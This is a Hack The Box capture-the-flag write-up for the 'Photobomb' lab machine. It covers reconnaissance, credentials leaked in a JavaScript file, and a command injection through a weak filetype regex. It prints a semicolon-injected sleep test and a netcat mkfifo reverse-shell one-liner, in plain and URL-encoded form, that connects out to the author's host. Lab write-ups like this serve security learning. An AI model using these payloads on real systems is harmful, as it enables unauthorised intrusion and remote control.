# Photobomb WIP
## Start: 24/10/2022
### IP Address: 10.10.11.182

Ok so first things first, nmap scan, -sV for services/versions -sC for any default scripts we can run, Pn to treat the host as online (as we know it is)

```
$> nmap 10.10.11.182 -sV -sC -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-24 19:53 BST
Nmap scan report for 10.10.11.182
Host is up (0.029s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.38 seconds

```

Ok standard server with SSH and a webbed site which seems to wanting to point us to photobomb.htb, which i'll add to my hosts file just for ease of use.

I mostly swap to the inbuilt browser in burpsuite whenever i look at websites just so that any action i take i can always send to the repeater function and replay them with modifications.

#### Homepage
![Picture of homepage](https://github.com/e-war/Writeups/blob/master/HackTheBox/Photobomb/Screenshots/home.png)
Page is very simple, has a link to a "printer" page with a username and password
Looking at the home page source code it seems some careless admin has just given out some credentials in the photobomb.js file loaded by default.
![Picture of leaked privs](https://github.com/e-war/Writeups/blob/master/HackTheBox/Photobomb/Screenshots/leaked_privs.png)
So pH0t0 : b0Mb! ok. the name Jameson given here could be useful too.
#### Printer page
![Picture of admin prompt](https://github.com/e-war/Writeups/blob/master/HackTheBox/Photobomb/Screenshots/printer.png)
Well we have some credentials.. might as well try them
![Picture of successful login](https://github.com/e-war/Writeups/blob/master/HackTheBox/Photobomb/Screenshots/printer_success.png)
So this page looks to ask us to select a picture and a size / filetype to download for printing purposes.
It does this by making a post request along with the form data to the same site at /printer, so lets make one manually, as we can specifiy the file name, my initial thought is can we potentially use this to view other files?

So lets hit that button and inspect the request!
![Picture of repeater](https://github.com/e-war/Writeups/blob/master/HackTheBox/Photobomb/Screenshots/repeat.png)
So we send a filename, filetype and size. 
Well lets not send anything! What do we get back? 500 error showing a backtrace of the ruby program which runs the server, including what it looks for. Here it shows it's matching a filename using 
![Picture of 500 error 1](https://github.com/e-war/Writeups/blob/master/HackTheBox/Photobomb/Screenshots/error_500_1.png)
```
if photo.match(/\.{2}|\//)
```
Well i dont know regex well enough, but it seems it checks for either a `..` or a `/` symbol to try to block directory inclusions
The filename seems secure enough, it can only find pictures that are there, ignores directories, and causes the whole page to error if the system doesn't find the file.
So lets try another parameter, we can use the same technique to view the regex backtrace for the filetype.
![Picture of 500 error 2](https://github.com/e-war/Writeups/blob/master/HackTheBox/Photobomb/Screenshots/error_500_2.png)
```
 if !filetype.match(/^(png|jpg)/)
```
again, im not the best with regex. but this regex allows any character as long as it has png or jpg in it, well lets try and breakout using this parameter, i'll put a semicolon and a sleep command and see what happens
```
photo=.&filetype=png;sleep 20&dimensions=0x0
```
and what do you know, that page took ages to load.. about 20 seconds!
![Picture of loading page](https://github.com/e-war/Writeups/blob/master/HackTheBox/Photobomb/Screenshots/waiting20.png)
### Command Injection
Well first things first, we seem to have command injection, can we reverse shell at this stage?
There are many different ways to reverse shell, the one that always seems to work for me is below:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $IP $PORT >/tmp/f
```
lets url encode that, setup a netcat listener and see if we get a connection!
![Picture of nc](https://github.com/e-war/Writeups/blob/master/HackTheBox/Photobomb/Screenshots/nc-startup.png)
encoded comes out to
```
%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%36%2e%35%31%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66
```
![Picture of exploit 1](https://github.com/e-war/Writeups/blob/master/HackTheBox/Photobomb/Screenshots/owned_page.png)
![Picture of exploit 2](https://github.com/e-war/Writeups/blob/master/HackTheBox/Photobomb/Screenshots/owned_shell.png)
SHELL ACCESS!
We are in command of the user "wizard", lets check this home directory out!
![Picture of user home folder](https://github.com/e-war/Writeups/blob/master/HackTheBox/Photobomb/Screenshots/user_folder.png)
And here we find the user.txt flag, I'll let you grab that yourself if you're reading this :)
